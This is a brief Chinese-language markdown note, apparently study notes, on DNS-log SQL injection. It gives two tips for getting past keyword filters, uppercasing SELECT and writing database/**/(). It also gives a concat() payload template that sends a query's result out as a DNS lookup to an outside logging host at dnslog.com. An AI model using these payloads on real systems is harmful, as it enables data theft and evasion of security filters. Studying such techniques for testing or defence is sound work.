## dnslog注入

> 小技巧 
>
> - 屏蔽`select`时可以尝试大写`SELECT`，屏蔽`database()`时可以尝试`database/**/()`

## `www.dnslog.com`

 - `concat('//',(数据库语句),'.dnslog地址/myjoy')`